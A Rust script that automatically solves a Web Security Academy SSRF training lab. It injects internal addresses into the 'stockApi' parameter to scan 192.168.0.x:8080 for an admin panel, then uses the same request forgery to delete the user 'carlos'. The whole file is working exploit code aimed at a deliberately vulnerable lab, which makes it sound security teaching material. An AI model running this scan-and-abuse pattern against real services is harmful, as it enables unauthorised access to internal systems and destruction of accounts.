/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 18/10/2023
*
* Lab: Basic SSRF against another back-end system
*
* Steps: 1. Inject payload into 'stockApi' parameter to scan the internal network
*        2. Delete carlos from the admin interface
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    process,
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a4a00f604dac6e8828d75be00e20062.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!("{} {}", "⟪#⟫ Injection point:".blue(), "stockApi".yellow(),);

    // string that will hold the payload
    let mut payload = String::new();

    // iterate over all possible numbers
    for x in 0..255 {
        // payload to scan the internal network
        payload = format!("http://192.168.0.{x}:8080/admin");

        print!(
            "\r{} ({}).. ",
            "⦗1⦘ Injecting payload to scan the internal netwrok".white(),
            format!("192.168.0.{x}:8080/admin").yellow()
        );
        io::stdout().flush();

        // fetch the page with the injected payload
        let res = client
            .post(format!("{url}/product/stock"))
            .form(&HashMap::from([("stockApi", &payload)]))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload".red()
            ));

        // if you found the internal server
        if res.status().as_u16() == 200 {
            println!("{}", "OK".green());
            print!(
                "{}",
                "⦗2⦘ Deleting carlos from the admin interface.. ".white(),
            );
            io::stdout().flush();

            // delete carlos
            client
                .post(format!("{url}/product/stock"))
                .form(&HashMap::from([(
                    "stockApi",
                    format!("{payload}/delete?username=carlos"),
                )]))
                .send()
                .expect(&format!(
                    "{}",
                    "[!] Failed to delete carlos from the admin interface".red()
                ));

            println!("{}", "OK".green());
            println!(
                "{} {}",
                "🗹 The lab should be marked now as"
                    .white()
                    .bold(),
                "solved".green().bold()
            );

            // exit from the program
            process::exit(0);
        }
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
